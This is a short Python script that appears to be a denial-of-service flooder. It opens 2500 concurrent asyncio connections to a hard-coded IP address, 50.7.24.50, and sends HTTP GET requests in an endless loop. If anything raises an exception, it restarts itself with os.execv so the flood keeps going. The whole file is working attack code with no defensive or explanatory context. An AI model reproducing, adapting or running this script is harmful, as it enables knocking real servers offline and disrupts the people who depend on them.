import asyncio
import os
import sys

import uvloop

uvloop.install()

async def main():
    async def worker():
        reader, writer = await asyncio.open_connection("50.7.24.50", 80)
        request = (
            b"GET / HTTP/1.1\r\n"
            b"Host: 50.7.24.50\r\n"
            b"Connection: keep-alive\r\n"
            b"\r\n"
        )
        while True:
            writer.write(request)
            await writer.drain()
    await asyncio.gather(*(worker() for _ in range(2500)))

try:
    asyncio.run(main())
except Exception as e:
    print(e)
    python = sys.executable
    os.execv(python, [python] + sys.argv)
